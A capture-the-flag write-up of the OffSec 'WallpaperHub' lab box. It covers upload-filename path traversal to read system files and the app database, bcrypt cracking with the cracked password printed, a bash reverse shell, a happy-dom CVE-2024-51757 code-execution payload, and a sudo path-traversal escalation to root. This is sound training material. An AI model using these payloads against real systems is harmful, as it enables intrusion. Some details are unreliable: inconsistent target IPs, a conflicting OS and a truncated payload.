# 📝 Proving Grounds Practice: WallpaperHub

## 🔍 Target Overview
* **Box Name:** WallpaperHub
* **Platform:** OffSec Proving Grounds (Practice)
* **OS:** Linux (Debian)
* **Target IP:** 192.168.58.204

## 1. Reconnaissance

### Nmap Scan
We start with a standard Nmap scan to enumerate open ports and services.
```bash
nmap -p- -sC -sV 192.168.60.204
```
<img width="350" height="130" alt="image" src="https://github.com/user-attachments/assets/39c3ff16-cf60-4542-a3c9-311e97bef83e" />

Open Ports Discovered:
22/tcp (SSH): OpenSSH 9.6p1 Ubuntu
80/tcp (HTTP): Apache httpd 2.4.58 (Ubuntu Default Page)
5000/tcp (HTTP): Werkzeug httpd 3.0.1 (Python 3.12.3) - "Wallpaper Hub - Home" 

### Web Enumeration (Port 80)

<img width="400" height="225" alt="image" src="https://github.com/user-attachments/assets/1199bfea-4cd2-449e-8b33-c0693dff7202" />

### Web Enumeration (Port 5000)
Navigating to port 5000 reveals the Wallpaper Hub application and a login page. Without credentials, we create a new account (Sush:Sush) to explore the authenticated surface.  

<img width="500" height="200" alt="image" src="https://github.com/user-attachments/assets/05886e2f-727c-4123-9900-aa906bc85e99" />

<img width="210" height="190" alt="image" src="https://github.com/user-attachments/assets/41865315-960a-4418-b1b5-49b958cc1acf" />

Running a directory brute-force with Gobuster reveals several application paths:
```bash
gobuster dir -u http://192.168.60.204:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="400" height="200" alt="image" src="https://github.com/user-attachments/assets/f9dab6a6-d704-4487-82b7-32000a06f446" />

Discovered Directories: /login, /register, /gallery, /subscriptions, /logout, /settings, /dashboard.

## 2. Vulnerability Discovery (LFI via File Upload)

The /settings page has a profile image upload functionality, but the "Save Changes" button does not work. 

<img width="400" height="230" alt="image" src="https://github.com/user-attachments/assets/86ad675b-6016-4a29-a372-5c8c8b8497e8" />

Moving to the "Upload Wallpaper" feature, we successfully upload an image.

<img width="500" height="190" alt="image" src="https://github.com/user-attachments/assets/886ed4f6-be96-49b7-96d1-486d2ff3beb7" />

We can view the image under "My Uploads"

<img width="500" height="330" alt="image" src="https://github.com/user-attachments/assets/2dd8e3c3-130d-4e06-9f05-5055c3a3c54a" />

Testing the upload restrictions reveals that non-image files are accepted.  
  -  We rename a text file from test.txt to test.png to bypass potential client-side filters.
  -  We intercept the upload request using Burp Suite and change the filename back to test.txt.

Uploading a PHP reverse shell fails to execute because the server forces the file to download instead of rendering it.  However, we can exploit this upload mechanism for Local File Inclusion (LFI). By modifying the filename parameter in Burp Suite to perform directory traversal, we can force the application to fetch local system files:
```Plaintext
filename="../../../../../../etc/passwd"
```
<img width="400" height="200" alt="image" src="https://github.com/user-attachments/assets/eec64f1e-c574-4052-9942-92e7699e712e" />

When we navigate to "My Uploads" and click "Download" on this newly uploaded item, we successfully download the remote machine's /etc/passwd file.  

<img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/166d39a9-d07f-4b12-aabc-cce0a5acdcfc" />

<img width="470" height="350" alt="image" src="https://github.com/user-attachments/assets/21ff1f4e-4e18-42fb-8d84-a87d44ec39a3" />

Reviewing the passwd file reveals a valid system user named **wp_hub**.  

## 3. Exploitation & Initial Access
### Database Extraction
We attempt to extract SSH keys from ../../../../../../home/wp_hub/.ssh/id_rsa, but the file is not found. Searching through standard web paths also yields no useful configuration files .  
Targeting the application's backend, we adjust the directory traversal payload to download the SQLite database:

```Plaintext
../../../../../../home/wp_hub/wallpaper_hub/database.db
```

<img width="500" height="190" alt="image" src="https://github.com/user-attachments/assets/ab20b34b-b069-438c-8bbc-5c2d8dc63186" />


### Credential Cracking
We inspect the downloaded database.db using sqlite3:
```Bash
sqlite3 database.db
sqlite> select * from users;
```

<img width="755" height="164" alt="image" src="https://github.com/user-attachments/assets/7c0ab29b-8909-4251-b958-7ee5fdc1264d" />

This query reveals the hashed password for the wp_hub user:
  -  Hash: $2b$12$lgsrjRa0imePu9iSnp1UsOPLWqAKKYym/z5R59UijsYZ5ss1nwijS

We use Hashcat with mode 3200 (bcrypt) and the rockyou.txt wordlist to crack it:
```Bash
hashcat -m 3200 wp_hub.hash /usr/share/wordlists/rockyou.txt
```
<img width="400" height="200" alt="image" src="https://github.com/user-attachments/assets/117e32c7-1226-4c65-a168-db1e97812c30" />

The hash cracks successfully, revealing the password: qazwsxedc
<img width="400" height="210" alt="image" src="https://github.com/user-attachments/assets/f5303774-5a55-4a9b-9496-6cfa7a87fdb9" />

### SSH Login
We establish an SSH session using the cracked credentials to gain our initial foothold as the wp_hub user.
```Bash
ssh wp_hub@192.168.58.204
# Password: qazwsxedc
```
<img width="410" height="205" alt="image" src="https://github.com/user-attachments/assets/1fc23a72-50ed-4e1e-a4a1-df983044f879" />

<img width="250" height="70" alt="image" src="https://github.com/user-attachments/assets/8daf3df8-86d0-411c-bf49-2b266594e0ad" />

## 4. Privilege Escalation
Checking our sudo privileges reveals a misconfigured executable:
```Bash
sudo -l
# (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
```

<img width="410" height="85" alt="image" src="https://github.com/user-attachments/assets/d89fb301-2e0d-4fb7-bb82-954f424761f0" />


The web-scraper script is a Node.js application (/opt/scraper/scraper.js) that takes a file path as an argument and utilizes the happy-dom JavaScript library to parse HTML files.

<img width="300" height="170" alt="image" src="https://github.com/user-attachments/assets/21a6d466-4b56-4fdc-bacd-52574779e7a3" />

Research indicates that vulnerable versions of happy-dom are susceptible to Arbitrary Code Execution (CVE-2024-51757) via malicious <script> tags due to improper input sanitization during the scraping process.  

<img width="200" height="110" alt="image" src="https://github.com/user-attachments/assets/cb7d3c5a-58cb-49b7-a9b4-a62fed6058ae" />


### Exploiting CVE-2024-51757
Step 1: Create the Reverse Shell Script
Create a bash script in the /tmp directory that will initiate a reverse shell back to our attacker machine.
```Bash
# /tmp/pwned.sh
#!//bin/bash
bash -i >& /dev/tcp/192.168.49.58/5000 0>&1
```


Step 2: Create the Malicious HTML Payload
Create the HTML payload in /tmp that exploits the happy-dom vulnerability to execute our bash script.
```JavaScript
# /tmp/pwned.html
const { Window } = require("happy-dom");
const window = new Window();
const document = window.document;
document.write(`<script src="https://localhost:8080/'+require('child_process').execSync('/tmp/pwned.sh')+'"></scr
```

Step 3: Catch the Root ShellStart a Netcat listener on the attacker machine:
```
Bashnc -lvnp 5000
```
Execute the web scraper using sudo. Because the sudoers file restricts execution to the /root/web_src_downloaded/*.html directory, we bypass this using directory traversal in the argument path to point to our payload in /tmp:
```Bash
sudo /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/pwned.html
```
<img width="260" height="80" alt="image" src="https://github.com/user-attachments/assets/6e25a74f-4c5a-460b-bd41-62364d0a5f25" />

The happy-dom library parses the malicious HTML, triggering our reverse shell script. We successfully catch the connection on our listener and obtain root access.  
